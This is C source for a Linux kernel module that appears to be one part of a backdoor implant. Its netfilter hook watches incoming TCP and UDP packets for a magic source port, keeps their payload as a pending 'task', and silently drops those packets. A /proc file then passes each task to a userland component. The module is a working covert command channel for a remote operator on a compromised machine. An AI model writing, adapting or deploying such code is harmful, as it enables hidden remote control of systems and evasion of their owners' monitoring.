
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/version.h>

#include <stddef.h>

#include "macros.h"

MODULE_AUTHOR("monstars");
MODULE_DESCRIPTION("nothin but net");
MODULE_LICENSE("GPL");

static struct nf_hook_ops s_hookops;
static struct proc_dir_entry* s_procfile;
static struct proc_ops s_procfileops;

static bool s_task_pending;
static char s_current_task[MAX_DATA_SIZE];

// Procfile READ callback - reports the stored task to userland
ssize_t read_callback(struct file* filep, char __user* buf, size_t count, loff_t* ppos)
{
    ssize_t retval = 0;
    size_t len = strnlen(s_current_task, MAX_DATA_SIZE);
    KERNEL_LOG("MONSTARS_NF : file READ (size %lu, off %lld)\n", count, *ppos);

    // Simplification: dump the whole task at once, always.
    if ((0 == *ppos) && (s_task_pending) && (count > len))
    {
        if (copy_to_user(buf, s_current_task, len))
        {
            retval = -EFAULT;
        }
        else
        {
            retval = len;
            *ppos = len;
            memset(s_current_task, 0, MAX_DATA_SIZE);
            s_task_pending = false;
        }
    }
    return retval;
}

// Procfile WRITE callback - not supported
ssize_t write_callback(struct file* filep, const char __user* buf, size_t count, loff_t* ppos)
{
    KERNEL_LOG("MONSTARS_NF : file WRITE \n");
    return (ssize_t)-1;
}


// The netfilter callback - checks for magic packets
unsigned int nf_callback(void* priv, struct sk_buff* sockbuf, const struct nf_hook_state* state)
{
    unsigned int retval = NF_ACCEPT;
    struct iphdr *iph = NULL;
    struct tcphdr *tcph = NULL;
    struct udphdr *udph = NULL;
    unsigned short src_port = 0;
    unsigned short dst_port = 0;
    unsigned char* data = NULL;

    if (sockbuf)
    {
        if ((iph = ip_hdr(sockbuf)))
        {
            if (IPPROTO_TCP == iph->protocol)
            {
                if ((tcph = (struct tcphdr *)((__u32 *)iph + iph->ihl)))
                {
                    src_port = ntohs(tcph->source);
                    dst_port = ntohs(tcph->dest);
                }
                if ((data = (unsigned char *)tcp_hdr(sockbuf)))
                {
                    data += sizeof(struct tcphdr);
                }

            }
            else if (IPPROTO_UDP == iph->protocol)
            {
                if ((udph = (struct udphdr *)((__u32 *)iph + iph->ihl)))
                {
                    src_port = ntohs(udph->source);
                    dst_port = ntohs(udph->dest);
                }
                if ((data = (unsigned char *)udp_hdr(sockbuf)))
                {
                    data += sizeof(struct udphdr);
                }
            }
            // look for magic source port
            if (MAGIC_SRC_PORT == src_port)
            {
                KERNEL_LOG("MONSTARS_NF : Magic %s %pI4:%d --> %pI4:%d\n",
                        (tcph ? "TCP" : "UDP"),
                        &iph->saddr, src_port, &iph->daddr, dst_port);
                if (NULL != data)
                {
                    KERNEL_LOG("MONSTARS_NF : Received:  %s\n", data);
                    // TODO: this overwrites any pending task-- do we want this?
                    strncpy(s_current_task, data, MAX_DATA_SIZE);
                    s_task_pending = true;
                }
                retval =  NF_DROP;
            }
        }
    }    
    return retval;
}

// Setup
int init_module()
{
    int retval = 0;

    s_task_pending = false;

    // Declare and initialize netfilter hook
    s_hookops.hook      = (nf_hookfn *) nf_callback;
    s_hookops.hooknum   = NF_INET_PRE_ROUTING;
    s_hookops.pf        = PF_INET;
    s_hookops.priority  = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
    if (nf_register_net_hook(&init_net, &s_hookops))
#else
    if (nf_register_hook(&s_hookops))
#endif
    {
        KERNEL_LOG("MONSTARS_NF : Error registering hook!\n");
        retval = 1;
    }

    // Declare and initialize /proc file hook
    s_procfileops.proc_read = read_callback;
    s_procfileops.proc_write = write_callback;
    
    s_procfile = proc_create(PROCFS_FILENAME, PROCFS_PERMISSIONS, NULL, &s_procfileops);
    if (NULL == s_procfile)
    {
        KERNEL_LOG("MONSTARS_NF : Error creating /proc file!\n");
        retval = 1;
    }
    
    KERNEL_LOG("MONSTARS_NF : Module init returned %d\n", retval);
    return retval;
}

// Cleanup
void cleanup_module()
{
    // Unregister netfilter hook
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
    nf_unregister_net_hook(&init_net, &s_hookops);
#else
    nf_unregister_hook(&s_hookops);
#endif

    // Remove /proc file
    if (NULL != s_procfile)
    {
        proc_remove(s_procfile);
    }

    KERNEL_LOG("MONSTARS_NF : Module decharged.\n");
}
